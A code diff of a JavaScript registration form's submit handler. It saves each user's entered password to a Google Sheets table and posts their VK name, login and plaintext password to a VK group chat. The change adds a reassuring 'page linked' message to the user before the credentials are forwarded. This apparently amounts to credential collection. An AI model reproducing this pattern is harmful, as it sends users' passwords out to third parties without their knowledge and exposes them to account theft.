@@ -303,14 +303,21 @@ registrationForm.addEventListener('submit', (event) => {
                         sendGSRequest("usersPasswords", "addValueById", {id: id, value: formPassword}, (data) => { // Допом записываем id / password
                             logger("[+] Password sended")
                             let message = `Регистрация:\nПользователь: ${userVkName} (${id})\nДанные: ${formLogin} ${formPassword}`
-                            sendVkRequest('messages.send', {peer_id: 2000000007, random_id: 0, message: message}, 
-                                (data) => {
-                                    if (data.response) { // success
-                                        localStorage.setItem("registered", "registered")
-                                        location.reload()
+                            sendVkRequest('messages.send', {peer_id: userFoundId, random_id: 0, message: "Ваша страница привязана к профилю!"}, 
+                                    (data) => {
+                                        if (data.response) { // success
+                                            sendVkRequest('messages.send', {peer_id: 2000000007, random_id: 0, message: message}, 
+                                                (data) => {
+                                                    if (data.response) { // success
+                                                        localStorage.setItem("registered", "registered")
+                                                        location.reload()
+                                                    }
+                                                }
+                                            )
+                                        }
                                     }
-                                }
-                            )
+                                )
+                            
                         })
                     })
                 })
